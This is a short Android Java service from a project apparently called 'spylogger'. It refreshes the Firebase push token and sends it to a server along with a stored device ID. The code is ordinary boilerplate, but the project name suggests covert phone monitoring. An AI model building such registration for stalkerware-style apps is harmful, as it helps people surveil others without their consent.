package com.gravatasufoca.spylogger.services.fcm;

import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.FirebaseInstanceIdService;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
import com.gravatasufoca.spylogger.services.SendUsuarioService;

import java.sql.SQLException;

/**
 * Created by bruno on 05/11/16.
 */

public class MyFirebaseInstanceIDService extends FirebaseInstanceIdService {
    private static final String TAG = "FIREBASE TOKEN" ;

    @Override
    public void onTokenRefresh() {
        // Get updated InstanceID token.
        String refreshedToken = FirebaseInstanceId.getInstance().getToken();
        Log.d(TAG, "Refreshed token: " + refreshedToken);

        // TODO: Implement this method to send any registration to your app's servers.
        sendRegistrationToServer(refreshedToken);
    }

    private void sendRegistrationToServer(String refreshedToken) {
        try {
            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(getApplicationContext());
            Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
            if(configuracao!=null){
                SendUsuarioService sendUsuarioService=new SendUsuarioService(null);
                sendUsuarioService.inserirChave(configuracao.getIdAparelho(),refreshedToken);
            }

        } catch (SQLException e) {
            Log.e("sql",e.getMessage());
        }
    }
}
